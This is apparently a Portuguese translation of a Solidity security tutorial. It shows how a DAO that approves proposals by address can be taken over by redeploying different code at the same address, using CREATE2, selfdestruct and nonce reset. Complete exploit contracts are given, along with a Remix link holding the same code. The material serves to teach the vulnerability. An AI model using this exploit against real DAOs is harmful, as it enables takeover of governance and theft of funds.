# Implementar contratos diferentes no mesmo endereço

O endereço do contrato implementado com `create` é calculado da seguinte forma.

```solidity
contract address = últimos 20 bytes de sha3(rlp_encode(sender, nonce))
```

em que o `sender` é o endereço do implantador e o `nonce` é o número de transacções enviadas pelo `sender`.

Assim, é possível implementar diferentes contratos no mesmo endereço se pudermos de alguma forma redefinir o nonce.

Abaixo está um exemplo de como um DAO pode ser hackeado.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
Chamado por Alice
0. Implantar DAO

Chamado pelo atacante
1. Implementar o DeployerDeployer
2. Chamada do DeployerDeployer.deploy()
3. Chamar Deployer.deployProposal()

Chamada por Alice
4. Obter a aprovação da proposta pelo DAO

Chamado pelo Attacker
5. Excluir a proposta e o implantador
6. Reimplantar o Deployer
7. Chamar Deployer.deployAttack()
8. Chamar DAO.execute
9. Verificar se DAO.owner é o endereço do atacante

DAO -- aprovado --> Proposta
DeployerDeployer -- create2 --> Deployer -- create --> Proposta
DeployerDeployer -- create2 --> Deployer -- create --> Attack
*/

contract DAO {
    struct Proposal {
        address target;
        bool approved;
        bool executed;
    }

    address public owner = msg.sender;
    Proposal[] public proposals;

    function approve(address target) external {
        require(msg.sender == owner, "not authorized");

        proposals.push(Proposal({target: target, approved: true, executed: false}));
    }

    function execute(uint256 proposalId) external payable {
        Proposal storage proposal = proposals[proposalId];
        require(proposal.approved, "not approved");
        require(!proposal.executed, "executed");

        proposal.executed = true;

        (bool ok, ) = proposal.target.delegatecall(
            abi.encodeWithSignature("executeProposal()")
        );
        require(ok, "delegatecall failed");
    }
}

contract Proposal {
    event Log(string message);

    function executeProposal() external {
        emit Log("Excuted code approved by DAO");
    }

    function emergencyStop() external {
        selfdestruct(payable(address(0)));
    }
}

contract Attack {
    event Log(string message);

    address public owner;

    function executeProposal() external {
        emit Log("Excuted code not approved by DAO :)");
        // For example - set DAO's owner to attacker
        owner = msg.sender;
    }
}

contract DeployerDeployer {
    event Log(address addr);

    function deploy() external {
        bytes32 salt = keccak256(abi.encode(uint(123)));
        address addr = address(new Deployer{salt: salt}());
        emit Log(addr);
    }
}

contract Deployer {
    event Log(address addr);

    function deployProposal() external {
        address addr = address(new Proposal());
        emit Log(addr);
    }

    function deployAttack() external {
        address addr = address(new Attack());
        emit Log(addr);
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}
```

## Teste no Remix

- [TornadoHack.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yMDsKCi8qCkNoYW1hZG8gcG9yIEFsaWNlCjAuIEltcGxhbnRhciBEQU8KCkNoYW1hZG8gcGVsbyBhdGFjYW50ZQoxLiBJbXBsZW1lbnRhciBvIERlcGxveWVyRGVwbG95ZXIKMi4gQ2hhbWFkYSBkbyBEZXBsb3llckRlcGxveWVyLmRlcGxveSgpCjMuIENoYW1hciBEZXBsb3llci5kZXBsb3lQcm9wb3NhbCgpCgpDaGFtYWRhIHBvciBBbGljZQo0LiBPYnRlciBhIGFwcm92YWNhbyBkYSBwcm9wb3N0YSBwZWxvIERBTwoKQ2hhbWFkbyBwZWxvIEF0dGFja2VyCjUuIEV4Y2x1aXIgYSBwcm9wb3N0YSBlIG8gaW1wbGFudGFkb3IKNi4gUmVpbXBsYW50YXIgbyBEZXBsb3llcgo3LiBDaGFtYXIgRGVwbG95ZXIuZGVwbG95QXR0YWNrKCkKOC4gQ2hhbWFyIERBTy5leGVjdXRlCjkuIFZlcmlmaWNhciBzZSBEQU8ub3duZXIgZSBvIGVuZGVyZWNvIGRvIGF0YWNhbnRlCgpEQU8gLS0gYXByb3ZhZG8gLS0+IFByb3Bvc3RhCkRlcGxveWVyRGVwbG95ZXIgLS0gY3JlYXRlMiAtLT4gRGVwbG95ZXIgLS0gY3JlYXRlIC0tPiBQcm9wb3N0YQpEZXBsb3llckRlcGxveWVyIC0tIGNyZWF0ZTIgLS0+IERlcGxveWVyIC0tIGNyZWF0ZSAtLT4gQXR0YWNrCiovCgpjb250cmFjdCBEQU8gewogICAgc3RydWN0IFByb3Bvc2FsIHsKICAgICAgICBhZGRyZXNzIHRhcmdldDsKICAgICAgICBib29sIGFwcHJvdmVkOwogICAgICAgIGJvb2wgZXhlY3V0ZWQ7CiAgICB9CgogICAgYWRkcmVzcyBwdWJsaWMgb3duZXIgPSBtc2cuc2VuZGVyOwogICAgUHJvcG9zYWxbXSBwdWJsaWMgcHJvcG9zYWxzOwoKICAgIGZ1bmN0aW9uIGFwcHJvdmUoYWRkcmVzcyB0YXJnZXQpIGV4dGVybmFsIHsKICAgICAgICByZXF1aXJlKG1zZy5zZW5kZXIgPT0gb3duZXIsICJub3QgYXV0aG9yaXplZCIpOwoKICAgICAgICBwcm9wb3NhbHMucHVzaChQcm9wb3NhbCh7dGFyZ2V0OiB0YXJnZXQsIGFwcHJvdmVkOiB0cnVlLCBleGVjdXRlZDogZmFsc2V9KSk7CiAgICB9CgogICAgZnVuY3Rpb24gZXhlY3V0ZSh1aW50MjU2IHByb3Bvc2FsSWQpIGV4dGVybmFsIHBheWFibGUgewogICAgICAgIFByb3Bvc2FsIHN0b3JhZ2UgcHJvcG9zYWwgPSBwcm9wb3NhbHNbcHJvcG9zYWxJZF07CiAgICAgICAgcmVxdWlyZShwcm9wb3NhbC5hcHByb3ZlZCwgIm5vdCBhcHByb3ZlZCIpOwogICAgICAgIHJlcXVpcmUoIXByb3Bvc2FsLmV4ZWN1dGVkLCAiZXhlY3V0ZWQiKTsKCiAgICAgICAgcHJvcG9zYWwuZXhlY3V0ZWQgPSB0cnVlOwoKICAgICAgICAoYm9vbCBvaywgKSA9IHByb3Bvc2FsLnRhcmdldC5kZWxlZ2F0ZWNhbGwoCiAgICAgICAgICAgIGFiaS5lbmNvZGVXaXRoU2lnbmF0dXJlKCJleGVjdXRlUHJvcG9zYWwoKSIpCiAgICAgICAgKTsKICAgICAgICByZXF1aXJlKG9rLCAiZGVsZWdhdGVjYWxsIGZhaWxlZCIpOwogICAgfQp9Cgpjb250cmFjdCBQcm9wb3NhbCB7CiAgICBldmVudCBMb2coc3RyaW5nIG1lc3NhZ2UpOwoKICAgIGZ1bmN0aW9uIGV4ZWN1dGVQcm9wb3NhbCgpIGV4dGVybmFsIHsKICAgICAgICBlbWl0IExvZygiRXhjdXRlZCBjb2RlIGFwcHJvdmVkIGJ5IERBTyIpOwogICAgfQoKICAgIGZ1bmN0aW9uIGVtZXJnZW5jeVN0b3AoKSBleHRlcm5hbCB7CiAgICAgICAgc2VsZmRlc3RydWN0KHBheWFibGUoYWRkcmVzcygwKSkpOwogICAgfQp9Cgpjb250cmFjdCBBdHRhY2sgewogICAgZXZlbnQgTG9nKHN0cmluZyBtZXNzYWdlKTsKCiAgICBhZGRyZXNzIHB1YmxpYyBvd25lcjsKCiAgICBmdW5jdGlvbiBleGVjdXRlUHJvcG9zYWwoKSBleHRlcm5hbCB7CiAgICAgICAgZW1pdCBMb2coIkV4Y3V0ZWQgY29kZSBub3QgYXBwcm92ZWQgYnkgREFPIDopIik7CiAgICAgICAgLy8gRm9yIGV4YW1wbGUgLSBzZXQgREFPJ3Mgb3duZXIgdG8gYXR0YWNrZXIKICAgICAgICBvd25lciA9IG1zZy5zZW5kZXI7CiAgICB9Cn0KCmNvbnRyYWN0IERlcGxveWVyRGVwbG95ZXIgewogICAgZXZlbnQgTG9nKGFkZHJlc3MgYWRkcik7CgogICAgZnVuY3Rpb24gZGVwbG95KCkgZXh0ZXJuYWwgewogICAgICAgIGJ5dGVzMzIgc2FsdCA9IGtlY2NhazI1NihhYmkuZW5jb2RlKHVpbnQoMTIzKSkpOwogICAgICAgIGFkZHJlc3MgYWRkciA9IGFkZHJlc3MobmV3IERlcGxveWVye3NhbHQ6IHNhbHR9KCkpOwogICAgICAgIGVtaXQgTG9nKGFkZHIpOwogICAgfQp9Cgpjb250cmFjdCBEZXBsb3llciB7CiAgICBldmVudCBMb2coYWRkcmVzcyBhZGRyKTsKCiAgICBmdW5jdGlvbiBkZXBsb3lQcm9wb3NhbCgpIGV4dGVybmFsIHsKICAgICAgICBhZGRyZXNzIGFkZHIgPSBhZGRyZXNzKG5ldyBQcm9wb3NhbCgpKTsKICAgICAgICBlbWl0IExvZyhhZGRyKTsKICAgIH0KCiAgICBmdW5jdGlvbiBkZXBsb3lBdHRhY2soKSBleHRlcm5hbCB7CiAgICAgICAgYWRkcmVzcyBhZGRyID0gYWRkcmVzcyhuZXcgQXR0YWNrKCkpOwogICAgICAgIGVtaXQgTG9nKGFkZHIpOwogICAgfQoKICAgIGZ1bmN0aW9uIGtpbGwoKSBleHRlcm5hbCB7CiAgICAgICAgc2VsZmRlc3RydWN0KHBheWFibGUoYWRkcmVzcygwKSkpOwogICAgfQp9&version=soljson-v0.8.20+commit.a1b79de6.js)
